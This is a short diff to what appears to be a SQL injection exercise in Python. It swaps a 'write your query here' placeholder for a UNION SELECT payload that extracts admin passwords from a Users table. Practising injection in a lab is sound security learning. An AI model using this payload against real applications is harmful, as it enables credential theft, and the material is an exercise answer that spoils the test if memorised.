@@ -4,7 +4,7 @@ import sqlite3
 import string
 
 def query():
-	return "write your query here"
+	return "a' UNION SELECT password FROM Users WHERE admin=1 AND password LIKE '"
 
 
 def main(argv):
